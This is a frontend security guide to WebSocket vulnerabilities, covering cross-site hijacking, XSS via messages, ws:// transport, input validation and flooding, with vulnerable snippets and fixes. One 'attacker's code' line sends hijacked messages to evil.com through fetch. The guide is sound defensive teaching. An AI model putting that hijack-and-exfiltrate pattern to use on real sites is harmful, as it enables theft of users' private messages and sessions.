WebSocket Vulnerabilities

How real-time connections bypass HTTP's security model, and what a frontend developer can do about it.

HTTP (request-response)

Client → GET /api/data
Server → 200 OK + payload
(connection closes)

WebSocket (persistent)

Client → GET /chat Upgrade
Server → 101 Switching
Client ↔ Server cookies sent!
High Cross-Site WebSocket Hijacking

How it works

  1. Victim is logged into your-app.com (has session cookie)
  2. Victim visits evil.com (attacker's page)
  3. evil.com runs new WebSocket('wss://your-app.com/chat')
  4. Browser attaches victim's cookies to the upgrade request automatically
  5. Server sees valid session — accepts connection
  6. Attacker reads/writes messages as the victim

Why it works

CORS doesn't apply to WebSocket connections. The browser sends cookies on the handshake just like any HTTP request, but there's no CSRF token mechanism built in.

Attacker's code
const ws = new WebSocket('wss://your-app.com/chat'); ws.onmessage = e => fetch('https://evil.com/steal?d=' + e.data);
Frontend fix — token-based auth
const ws = new WebSocket('wss://your-app.com/chat'); ws.onopen = () => ws.send(JSON.stringify({ type: 'auth', token: getCSRFToken() }));
Server fix — check Origin header
if (!['https://your-app.com'].includes(req.headers.origin)) req.destroy(); // reject cross-origin handshake
High XSS via WebSocket Messages

How it works

  1. Attacker sends a crafted message through the WebSocket (e.g., in a chat app)
  2. Server relays the message to all connected clients
  3. Your frontend renders it with innerHTML
  4. The payload executes in every connected user's browser
The vulnerable pattern
ws.onmessage = (e) => { const data = JSON.parse(e.data); chatDiv.innerHTML += '<p>' + data.message + '</p>'; // XSS! };
Fix — use textContent
const p = document.createElement('p'); p.textContent = data.message; // safe: HTML is escaped chatDiv.appendChild(p);
Fix — sanitize if rich content needed
chatDiv.innerHTML += DOMPurify.sanitize(data.message);
High Unencrypted Transport (ws://)

How it works

  1. App connects with ws:// instead of wss://
  2. All WebSocket frames travel unencrypted over the network
  3. An attacker on the same network (coffee shop, hotel) reads and modifies every message
Insecure
new WebSocket('ws://your-app.com/chat'); // plaintext!
Fix — one character
new WebSocket('wss://your-app.com/chat'); // TLS encrypted

If your site serves over HTTPS, browsers block ws:// as mixed content anyway. Always use wss://.

Medium No Input Validation

How it works

  1. WebSocket is a raw pipe — no built-in schema, no content-type
  2. Attacker sends malformed JSON, unexpected types, or oversized payloads
  3. Your code crashes, misbehaves, or processes data it shouldn't
Vulnerable
ws.onmessage = (e) => { const data = JSON.parse(e.data); // throws on bad JSON process(data.action); // no type check, no shape check };
Fix — validate everything
ws.onmessage = (e) => { let data; try { data = JSON.parse(e.data); } catch { return; } if (typeof data.type !== 'string') return; if (typeof data.message !== 'string') return; if (data.message.length > 10000) return; renderMessage(data); };
Medium Message Flooding / DoS

How it works

  1. WebSocket has no built-in rate limiting
  2. A malicious or buggy client blasts thousands of messages per second
  3. Server overwhelmed, other users lag or disconnect; your UI freezes
Client-side rate limiter
let count = 0; const MAX_PER_SEC = 50; setInterval(() => { count = 0; }, 1000); ws.onmessage = (e) => { if (++count > MAX_PER_SEC) return; // drop excess handleMessage(e.data); };
